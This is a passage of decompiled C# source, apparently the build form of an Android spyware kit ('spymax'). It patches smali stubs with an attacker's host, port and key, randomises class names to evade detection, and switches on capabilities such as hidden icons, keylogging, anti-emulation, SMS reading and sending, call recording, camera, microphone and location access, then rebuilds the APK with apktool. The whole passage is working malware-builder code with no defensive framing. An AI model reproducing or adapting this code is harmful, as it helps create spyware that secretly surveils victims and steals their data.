							}
						}
						for (;;)
						{
							try
							{
								string text24;
								for (;;)
								{
									text24 = this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\servziz";
									if (Directory.Exists(text24))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								int num5 = 1;
								do
								{
									string text25 = this.RandommMadv2(10, 15);
									File.WriteAllText(text24 + "\\" + text25 + ".smali", text.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("[MYNAME]", "activz/servziz/" + text25));
									num5++;
								}
								while (num5 <= 10);
								DirectoryInfo directoryInfo4 = new DirectoryInfo(text24);
								FileInfo[] files4 = directoryInfo4.GetFiles("*.smali");
								this.LogB("Phase 4\r\n---------");
								FileInfo[] array7 = files4;
								foreach (FileInfo fileInfo4 in array7)
								{
									string text26 = File.ReadAllText(fileInfo4.FullName);
									string contents8 = (Operators.CompareString(fileInfo4.Name.ToLower(), "buildconfig.smali", false) != 0) ? text26.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("ClassGen14", this.NClassGen14).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("_clss_loder_", this.N_clss_loder_).Replace("_excut_meth_", this.N_excut_meth_).Replace("_run_comnd_", this.N_run_comnd_).Replace("_get_me_fil_", this.N_get_me_fil_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("suffix", this.flavor).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.KEY))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ip))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ports))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[TYPE-HIDE]", this.THETYPE).Replace("skin.info", this.FAKEAPPlink).Replace("USE-SUPER", this.isuper).Replace("[US-UNINS]", this.anuninstall).Replace("[NO_OXA]", this.isAOX).Replace("USE-AUTOUL", this.isautounlock).Replace("USE-DATAUSAGE", this.isnetwork).Replace("USE-ONECAP", this.iscaponce).Replace("[NAME>LNK>ID!]", this.MonitorPack).Replace("[TRAK-IT]", this.trackerlist).Replace("USE-BIND", this.isBind).Replace("USE-SKIP", this.isskipreinstall).Replace("USE-SCREENON", this.iskeepscreen).Replace("USE-BLOCKP", this.isHideprims).Replace("USE-ADMIN", this.isadmin).Replace("USE-AUTOS", this.isautostart).Replace("[SS]", this.Prim_sendsms).Replace("[RC]", this.Prim_recordcalls).Replace("[SW]", this.Prim_wallpaper).Replace("[RS]", this.Prim_readsms).Replace("[RCG]", this.Prim_calllog).Replace("[CRC]", this.Prim_readcontact).Replace("[GA]", this.Prim_readacounts).Replace("[CA]", this.Prim_camera).Replace("[MC]", this.Prim_microphone).Replace("[LOC1]", this.Prim_loacation1).Replace("[LOC2]", this.Prim_loacation2).Replace("[LOC3]", this.Prim_loacation3).Replace("[CL]", this.Prim_callphone).Replace("USE-QUICK", this.isQuick).Replace("USE-DRAW", this.isDrawing).Replace("USE-NOTIFI", this.isnotifi).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.new_exit_mth).Replace("_wifipolc_meth_", this.new_wifipolc).Replace("_formtpakt_methd_", this.new_formatpacket).Replace("_DZIP_meth_", this.new_dzip).Replace("_Getbyte_meth_", this.new_getbyte).Replace("_D_BASE64_", this.new_base_mth).Replace("_getstr_meth_", this.new_getstr).Replace("_CZIP_meth_", this.new_czip).Replace("_inst_bnd_", this.new_inst).Replace("_strt_con_", this.new_strt_con_).Replace("[USE-REC]", this.UseRecorder).Replace("[com.app.instll", "com.appd.instll.load").Replace("_fist_inf_", this.new_fist_inf_).Replace("_new_con_", this.new_new_con_).Replace("[delayacess]", this.delayaccesstext.Text).Replace("trg.trgtapp.trg", this.TheTarget).Replace("_send_it_", this.new_send_it_).Replace("_Reblace_", this.new_Reblace_).Replace("_runn_srv_", this.new_runn_srv_).Replace("[off_keylog]", this.OFFKEYLOG).Replace("[NO_EMUALTOR]", this.ANTIEMO).Replace("_NOTIFI_TITLE_", this.NOTIFI_TITLE).Replace("_NOTIFI_MSG_", this.NOTIFI_MSG).Replace("_randomS_shit_", this.RandommClass(100, 200)).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("[CYPHER_FUT3EX]", "0000") : text26.Replace("payload", this.payload).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
									File.WriteAllText(fileInfo4.FullName, contents8);
								}
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						for (;;)
						{
							try
							{
								string text27;
								for (;;)
								{
									text27 = this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz";
									if (Directory.Exists(text27))
									{
										break;
									}
									Thread.Sleep(this._Time);
								}
								int num6 = 1;
								do
								{
									string text28 = this.RandommMadv2(10, 15);
									File.WriteAllText(text27 + "\\" + text28 + ".smali", text.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("[MYNAME]", "activz/tolziz/" + text28));
									num6++;
								}
								while (num6 <= 10);
								DirectoryInfo directoryInfo5 = new DirectoryInfo(text27);
								FileInfo[] files5 = directoryInfo5.GetFiles("*.smali");
								this.LogB("Phase 5\r\n---------");
								FileInfo[] array9 = files5;
								foreach (FileInfo fileInfo5 in array9)
								{
									string text29 = File.ReadAllText(fileInfo5.FullName);
									string contents8 = (Operators.CompareString(fileInfo5.Name.ToLower(), "buildconfig.smali", false) != 0) ? text29.Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("ClassGen0", this.NClassGen0).Replace("ClassGen1", this.NClassGen1).Replace("ClassGen2", this.NClassGen2).Replace("ClassGen3", this.NClassGen3).Replace("ClassGen4", this.NClassGen4).Replace("ClassGen5", this.NClassGen5).Replace("ClassGen6", this.NClassGen6).Replace("ClassGen8", this.NClassGen8).Replace("ClassGen9", this.NClassGen9).Replace("ClassGen10", this.NClassGen10).Replace("ClassGen11", this.NClassGen11).Replace("ClassGen12", this.NClassGen12).Replace("ClassGen13", this.NClassGen13).Replace("ClassGen14", this.NClassGen14).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("tolziz", this.Ntolziz).Replace("brodatz", this.Nbrodatz).Replace("RequestBattery", this.NRequestBattery).Replace("RequestDraw", this.NRequestDraw).Replace("_sc_fb_", this.N_sc_fb_).Replace("_news_g_", this.N_news_g_).Replace("_strt_view_", this.N_strt_view_).Replace("HandelScreenCap", this.NHandelScreenCap).Replace("RequestAccess", this.NRequestAccess).Replace("StartScreenCap", this.NStartScreenCap).Replace("_trns_g_", this.N_trns_g_).Replace("RequestPermissions", this.NRequestPermissions).Replace("_engine_wrk_", this.N_engine_wrk_).Replace("_skin_cls_", this.N_skin_cls_).Replace("_update_app_", this.N_update_app_).Replace("_callr_lsnr_", this.N_callr_lsnr_).Replace("_clss_loder_", this.N_clss_loder_).Replace("_excut_meth_", this.N_excut_meth_).Replace("_run_comnd_", this.N_run_comnd_).Replace("_get_me_fil_", this.N_get_me_fil_).Replace("CommandsService", this.NCommandsService).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("suffix", this.flavor).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.KEY))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ip))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.ports))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[TYPE-HIDE]", this.THETYPE).Replace("skin.info", this.FAKEAPPlink).Replace("USE-SUPER", this.isuper).Replace("[US-UNINS]", this.anuninstall).Replace("[NO_OXA]", this.isAOX).Replace("USE-AUTOUL", this.isautounlock).Replace("USE-DATAUSAGE", this.isnetwork).Replace("USE-ONECAP", this.iscaponce).Replace("[NAME>LNK>ID!]", this.MonitorPack).Replace("[TRAK-IT]", this.trackerlist).Replace("USE-BIND", this.isBind).Replace("USE-SKIP", this.isskipreinstall).Replace("USE-SCREENON", this.iskeepscreen).Replace("USE-BLOCKP", this.isHideprims).Replace("USE-ADMIN", this.isadmin).Replace("USE-AUTOS", this.isautostart).Replace("[SS]", this.Prim_sendsms).Replace("[RC]", this.Prim_recordcalls).Replace("[SW]", this.Prim_wallpaper).Replace("[RS]", this.Prim_readsms).Replace("[RCG]", this.Prim_calllog).Replace("[CRC]", this.Prim_readcontact).Replace("[GA]", this.Prim_readacounts).Replace("[CA]", this.Prim_camera).Replace("[MC]", this.Prim_microphone).Replace("[LOC1]", this.Prim_loacation1).Replace("[LOC2]", this.Prim_loacation2).Replace("[LOC3]", this.Prim_loacation3).Replace("[CL]", this.Prim_callphone).Replace("USE-QUICK", this.isQuick).Replace("USE-DRAW", this.isDrawing).Replace("USE-NOTIFI", this.isnotifi).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.new_exit_mth).Replace("_wifipolc_meth_", this.new_wifipolc).Replace("_formtpakt_methd_", this.new_formatpacket).Replace("_DZIP_meth_", this.new_dzip).Replace("_Getbyte_meth_", this.new_getbyte).Replace("_D_BASE64_", this.new_base_mth).Replace("_getstr_meth_", this.new_getstr).Replace("_CZIP_meth_", this.new_czip).Replace("_inst_bnd_", this.new_inst).Replace("_strt_con_", this.new_strt_con_).Replace("[USE-REC]", this.UseRecorder).Replace("[com.app.instll", "com.appd.instll.load").Replace("_fist_inf_", this.new_fist_inf_).Replace("_new_con_", this.new_new_con_).Replace("trg.trgtapp.trg", this.TheTarget).Replace("[delayacess]", this.delayaccesstext.Text).Replace("_send_it_", this.new_send_it_).Replace("_Reblace_", this.new_Reblace_).Replace("_runn_srv_", this.new_runn_srv_).Replace("[off_keylog]", this.OFFKEYLOG).Replace("[NO_EMUALTOR]", this.ANTIEMO).Replace("_NOTIFI_TITLE_", this.NOTIFI_TITLE).Replace("_NOTIFI_MSG_", this.NOTIFI_MSG).Replace("_randomS_shit_", this.RandommClass(100, 200)).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("[CYPHER_FUT3EX]", "0000") : text29.Replace("payload", this.payload).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
									File.WriteAllText(fileInfo5.FullName, contents8);
								}
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						try
						{
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\servziz", this.Nservziz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz", this.Ntolziz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz", this.Nbrodatz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz", this.Nactivz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax\\stub7", this.pack2);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.folder_apktool + "\\temp\\smali\\spymax", this.pack1);
						}
						catch (Exception ex)
						{
							Exception ex2 = ex;
							Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
						}
						try
						{
							IL_470C:
							while (!File.Exists(path5))
							{
								Thread.Sleep(this._Time);
							}
							string contents9 = File.ReadAllText(path5).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("CYPHER_PATCH", this.namepatch).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
							File.WriteAllText(path5, contents9);
							goto IL_48C9;
						}
						catch (Exception)
						{
							Thread.Sleep(this._Time);
						}
						goto IL_4878;
						for (;;)
						{
							IL_48C9:
							try
							{
								while (!File.Exists(text2))
								{
									Thread.Sleep(this._Time);
								}
								MyProject.Computer.FileSystem.RenameFile(text2, this.NwebXML + ".xml");
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						for (;;)
						{
							try
							{
								while (!File.Exists(text3))
								{
									Thread.Sleep(this._Time);
								}
								MyProject.Computer.FileSystem.RenameFile(text3, this.NnotifiXML + ".xml");
								break;
							}
							catch (Exception)
							{
								Thread.Sleep(this._Time);
							}
						}
						this.vulTrack = 80;
						try
						{
						}
						catch (Exception)
						{
						}
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
						{
							"apktool b temp"
						}, null, null, null, true);
						break;
						IL_4878:
						goto IL_470C;
					}
					catch (Exception)
					{
						Thread.Sleep(this._Time);
						continue;
					}
				}
				Thread.Sleep(this._Time);
			}
		}
	}

	// Token: 0x0600021B RID: 539 RVA: 0x00043C94 File Offset: 0x00041E94
	public void MoveRandomFile(string from, string to)
	{
		if (this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init, ref flag);
			if (this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State == 0)
			{
				this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State = 2;
				this._0024STATIC_0024MoveRandomFile_00242021EE_0024r = new Random();
			}
			else if (this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this._0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init);
			}
		}
		FileInfo[] files = new DirectoryInfo(from).GetFiles();
		FileInfo fileInfo = files[this._0024STATIC_0024MoveRandomFile_00242021EE_0024r.Next(0, checked(files.Count<FileInfo>() - 1))];
		File.Move(fileInfo.FullName, fileInfo.FullName.Replace(from, to));
	}

	// Token: 0x0600021C RID: 540 RVA: 0x00043D78 File Offset: 0x00041F78
	public void MoveRandomDIR(string from, string to)
	{
		if (this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init, ref flag);
			if (this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State == 0)
			{
				this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State = 2;
				this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r = new Random();
			}
			else if (this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init);
			}
		}
		DirectoryInfo[] directories = new DirectoryInfo(from).GetDirectories();
		DirectoryInfo directoryInfo = directories[this._0024STATIC_0024MoveRandomDIR_00242021EE_0024r.Next(0, checked(directories.Count<DirectoryInfo>() - 1))];
		Directory.Move(directoryInfo.FullName, directoryInfo.FullName.Replace(from, to));
	}

	// Token: 0x0600021D RID: 541 RVA: 0x00043E5C File Offset: 0x0004205C
	private void LogB(string Str)
	{
		if (base.InvokeRequired)
		{
			string[] array = new string[]
			{
				Str
			};
			Delegate method = new Action<string>(this.LogB);
			object[] args = array;
			base.Invoke(method, args);
		}
		else
		{
			this.TextBox1.AppendText("\r\n-> " + Str);
		}
	}

	// Token: 0x0600021E RID: 542 RVA: 0x00043EAC File Offset: 0x000420AC
	private void LOGEND(string Str)
	{
		if (base.InvokeRequired)
		{
			string[] array = new string[]
			{
				Str
			};
			Delegate method = new Action<string>(this.LOGEND);
			object[] args = array;
			base.Invoke(method, args);
		}
		else
		{
			this.TextBox1.AppendText(Str);
		}
	}

	// Token: 0x0600021F RID: 543 RVA: 0x00043EF0 File Offset: 0x000420F0
	private void Close_cmd()
	{
		try
		{
			Application.ExitThread();
			NewLateBinding.LateCall(this.CMD, null, "CancelOutputRead", new object[0], null, null, null, true);
			NewLateBinding.LateCall(this.CMD, null, "CancelErrorRead", new object[0], null, null, null, true);
			NewLateBinding.LateCall(this.CMD, null, "Kill", new object[0], null, null, null, true);
			NewLateBinding.LateCall(this.CMD, null, "Close", new object[0], null, null, null, true);
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000220 RID: 544 RVA: 0x00043F88 File Offset: 0x00042188
	private void ex()
	{
		try
		{
			this.Close_cmd();
		}
		catch (Exception)
		{
		}
		finally
		{
		}
	}

	// Token: 0x06000221 RID: 545 RVA: 0x00043FC0 File Offset: 0x000421C0
	private void KillA(bool first)
	{
		try
		{
			Process.GetProcessesByName("java")[0].Kill();
		}
		catch (Exception)
		{
		}
		try
		{
			Process.GetProcessesByName("cmd")[0].Kill();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000222 RID: 546 RVA: 0x00044018 File Offset: 0x00042218
	public string HMI()
	{
		return this.GVSNAME().ToString();
	}

	// Token: 0x06000223 RID: 547 RVA: 0x00044034 File Offset: 0x00042234
	private void saveAll()
	{
		MySettingsProperty.Settings.build_text_name_victim = this.TextNameVictim.Text;
		MySettingsProperty.Settings.build_text_name_patch = this.TextNamePatch.Text;
		MySettingsProperty.Settings.build_text_version = this.TextVersion.Text;
		MySettingsProperty.Settings.build_text_sleep = Conversions.ToInteger("0");
		MySettingsProperty.Settings.build_text_port = Conversions.ToInteger(this.po.Text);
		MySettingsProperty.Settings.build_Checked_hide = this.CheckHide.Checked;
		MySettingsProperty.Settings.build_Checked_doze = this.CheckDoze.Checked;
		MySettingsProperty.Settings.build_Checked_icon = this.CheckIconPatch.Checked;
		MySettingsProperty.Settings.build_path_icon = this.iconPatch;
		MySettingsProperty.Settings.BIND_Path = this.BIND_Path;
		MySettingsProperty.Settings.BIND_EX = this.BIND_EX;
		MySettingsProperty.Settings.intent = this.intent_;
		string build_DGV_list = this.TextIP.Text + ":" + this.po.Text;
		MySettingsProperty.Settings.build_DGV_list = build_DGV_list;
		MySettingsProperty.Settings.Save();
	}

	// Token: 0x06000224 RID: 548 RVA: 0x00044164 File Offset: 0x00042364
	internal string GVSNAME()
	{
		ManagementObject managementObject = new ManagementObject(string.Format("win32_logicaldisk.deviceid=\"{0}:\"", "C"));
		managementObject.Get();
		return managementObject[Codes.AES_Decrypt("8tqSUqXFSzzZ4A7ikUbVogUwXcIXSn1opihYRqEbX0o=", "Timer1")].ToString();
	}

	// Token: 0x06000225 RID: 549 RVA: 0x000441A8 File Offset: 0x000423A8
	private void Build_Closing(object sender, CancelEventArgs e)
	{
		if (this.TiMAT.Enabled)
		{
			this.TiMAT.Enabled = false;
		}
		base.DialogResult = DialogResult.Cancel;
	}

	// Token: 0x06000226 RID: 550 RVA: 0x0000206C File Offset: 0x0000026C
	private void TextVersion_KeyPress(object sender, KeyPressEventArgs e)
	{
	}

	// Token: 0x06000227 RID: 551 RVA: 0x0000206C File Offset: 0x0000026C
	private void TextVersion_KeyDown(object sender, KeyEventArgs e)
	{
	}

	// Token: 0x06000228 RID: 552 RVA: 0x000441D8 File Offset: 0x000423D8
	private void TextFlavor_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Back)
		{
			this.keyback = true;
		}
		else
		{
			this.keyback = false;
		}
	}

	// Token: 0x06000229 RID: 553 RVA: 0x00044200 File Offset: 0x00042400
	private void sleep_TextChanged(object sender, EventArgs e)
	{
		TimeSpan timeSpan = TimeSpan.FromMilliseconds(0.0);
		string str = string.Empty;
		if (timeSpan.Days != 0)
		{
			str = str + "Days " + Conversions.ToString(timeSpan.Days) + "\r\n";
		}
		if (timeSpan.Hours != 0)
		{
			str = str + "Hours:" + Conversions.ToString(timeSpan.Hours) + "\r\n";
		}
		if (timeSpan.Minutes != 0)
		{
			str = str + "Minutes:" + Conversions.ToString(timeSpan.Minutes) + "\r\n";
		}
		if (timeSpan.Seconds != 0)
		{
			str = str + "Seconds:" + Conversions.ToString(timeSpan.Seconds) + "\r\n";
		}
		if (timeSpan.Milliseconds != 0)
		{
			str = str + "Millis " + Conversions.ToString(timeSpan.Milliseconds) + "\r\n";
		}
	}

	// Token: 0x0600022A RID: 554 RVA: 0x0000206C File Offset: 0x0000026C
	private void b_del_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600022B RID: 555 RVA: 0x000024D2 File Offset: 0x000006D2
	private void btnUp_Click(object sender, EventArgs e)
	{
		this.Rowinsert(false);
	}

	// Token: 0x0600022C RID: 556 RVA: 0x000024DB File Offset: 0x000006DB
	private void btnDown_Click(object sender, EventArgs e)
	{
		this.Rowinsert(true);
	}

	// Token: 0x0600022D RID: 557 RVA: 0x0000206C File Offset: 0x0000026C
	private void Rowinsert(bool isDown)
	{
	}

	// Token: 0x0600022E RID: 558 RVA: 0x00044304 File Offset: 0x00042504
	private void Build_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			try
			{
				try
				{
					if (this.tracklist.Items.Count > 0)
					{
						if (MySettingsProperty.Settings.ListBoxTracker == null)
						{
							MySettingsProperty.Settings.ListBoxTracker = new StringCollection();
						}
						if (MySettingsProperty.Settings.ListBoxTracker != null)
						{
							MySettingsProperty.Settings.ListBoxTracker.Clear();
						}
						MySettingsProperty.Settings.ListBoxTracker.AddRange(this.tracklist.Items.OfType<string>().ToArray<string>());
						MySettingsProperty.Settings.Save();
					}
				}
				catch (Exception)
				{
				}
			}
			catch (Exception)
			{
			}
			try
			{
				if (this.listmonitor.Items.Count > 0)
				{
					if (MySettingsProperty.Settings.ListBoxItems == null)
					{
						MySettingsProperty.Settings.ListBoxItems = new StringCollection();
					}
					if (MySettingsProperty.Settings.ListBoxItems != null)
					{
						MySettingsProperty.Settings.ListBoxItems.Clear();
					}
					MySettingsProperty.Settings.ListBoxItems.AddRange(this.listmonitor.Items.OfType<string>().ToArray<string>());
					MySettingsProperty.Settings.Save();
				}
			}
			catch (Exception)
			{
			}
			MySettingsProperty.Settings.NotifiTitle = this.Nottitle.Text;
			MySettingsProperty.Settings.NotifiText = this.Notmsg.Text;
			MySettingsProperty.Settings.bodytext = this.logbodytext.Text;
			MySettingsProperty.Settings.accessdiscribe = this.dscriptext.Text;
			MySettingsProperty.Settings.Save();
			try
			{
				MySettingsProperty.Settings.inj_thost = this.TextIP.Text;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception)
			{
			}
			if (File.Exists(this.folder_apktool + "\\temp.apk"))
			{
				File.Delete(this.folder_apktool + "\\temp.apk");
			}
		}
		catch (Exception)
		{
		}
		this.KillA(false);
	}

	// Token: 0x0600022F RID: 559 RVA: 0x0000206C File Offset: 0x0000026C
	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	// Token: 0x06000230 RID: 560 RVA: 0x00044558 File Offset: 0x00042758
	private void Combotype_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.combotype.Text, "Custom", false) == 0)
		{
			if (RegistryHandler.getwtipanti() == null)
			{
				RegistryHandler.settipanti("done");
				Codes.MyMsgBox("Tip", "in order to make anti-delete work well , use the same app name from page 1 (info)", false, Resources.information48px);
			}
			this.fakepanel.Enabled = true;
